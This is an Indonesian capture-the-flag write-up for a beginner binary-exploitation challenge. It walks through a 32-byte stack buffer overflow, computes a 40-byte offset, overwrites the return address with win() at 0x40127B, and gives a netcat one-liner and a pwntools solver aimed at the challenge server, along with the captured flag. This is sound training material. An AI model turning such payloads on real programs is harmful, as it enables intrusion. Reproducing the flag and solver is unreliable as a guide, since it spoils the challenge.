**Kategori:** Pwn / Binary Exploitation  <br>
**File:** `chall` (ELF 64-bit) <br>
**Flag:** `HCS{g0xD4mnnn_you_m4de_it_p41s_5e3_y0U_iN_HCS_^^_}` <br>
**AI Chat:** https://chat.ragita.net/s/b096d09b-dc6c-4d43-9bce-7617000588eb <br>

---

## 1. Deskripsi Challenge

Challenge pwn pembuka: program menyapa, meminta nama lewat `stdin`, lalu menyimpannya ke sebuah buffer di stack tanpa bounds-check. Klasik **stack buffer overflow** dengan pola *ret2win* — sudah ada fungsi `win()` yang membaca `flag.txt`, tinggal dibelokkan alur eksekusinya ke sana.

Instance remote:

```
ncat --ssl welcome-to-hcs-5bd6abccc814.challenge.hcs-team.com 1337
```

---

## 2. Recon Awal

Dari disassembly ada **dua fungsi yang menarik**:

### 2.1 `vuln` — `0x401336`

```asm
0000000000401336 <vuln>:
  401336:  endbr64
  40133a:  push   %rbp
  40133b:  mov    %rsp,%rbp
  40133e:  sub    $0x20,%rsp          ; buffer 32 byte di rbp-0x20
  401342:  lea    0xd47(%rip),%rax    ; "Before we let you in, what's your name?"
  ...
  401360:  call   4010d0 <printf@plt>
```

Buffer input berada di `rbp-0x20` → **32 byte**, dan input dibaca tanpa batas panjang.

### 2.2 `win` — `0x40127B`

```asm
000000000040127b <win>:
  40127b:  endbr64
  40127f:  push   %rbp
  ...
  40129e:  call   401110 <fopen@plt>  ; buka flag.txt lalu cetak isinya
```

`win()` inilah yang membaca `flag.txt` dan mencetaknya — target ret2win kita.

---

## 3. Menghitung Offset

Layout stack frame `vuln` (dari atas ke bawah):

| Posisi | Offset relatif terhadap RBP | Ukuran |
| :--- | :--- | :--- |
| buffer | `rbp-0x20` | 32 byte |
| saved RBP | `rbp` | 8 byte |
| return address (RIP) | `rbp+8` | — |

Jadi untuk menimpa **return address** dibutuhkan:

```
  32 byte  (buffer)
+  8 byte  (saved RBP)
= 40 byte
```

Setelah 40 byte padding, 8 byte berikutnya akan menimpa RIP → isi dengan alamat `win` (`0x40127B`).

---

## 4. Exploit

### 4.1 Payload manual (one-liner)

Alamat `win` = `0x40127B` → little-endian: `\x7b\x12\x40\x00\x00\x00\x00\x00`.

```bash
{ printf '0000000000000000000000000000000000000000' ; \
  printf '\x7b\x12\x40\x00\x00\x00\x00\x00\n'; sleep 2; } \
  | ncat --ssl welcome-to-hcs-5bd6abccc814.challenge.hcs-team.com 1337
```

### 4.2 Solver (pwntools)

```python
from pwn import *

context.arch = "amd64"

WIN = 0x40127B  # win() -- reads flag.txt and prints it
OFFSET = 40     # 32-byte buffer (rbp-0x20) + 8-byte saved rbp

exe = "./chall"

if len(sys.argv) > 1:
    host, port = sys.argv[1], int(sys.argv[2])
    p = remote(host, port)
else:
    p = process(exe)

p.recvuntil(b"name?")
payload = b"A" * OFFSET + p64(WIN)
p.sendline(payload)

print(p.recvall(timeout=3).decode(errors="replace"))
```

---

## 5. Verifikasi

```
--- Welcome to HCS ---
Welcome to HCS! Before we let you in, what's your name?
> Nice to meet you, 0000...0000@! See you around.
Congratulations, welcome to HCS!
HCS{g0xD4mnnn_you_m4de_it_p41s_5e3_y0U_iN_HCS_^^_}
```

Return address berhasil ditimpa ke `win()`, `flag.txt` tercetak. 
_Solved!_
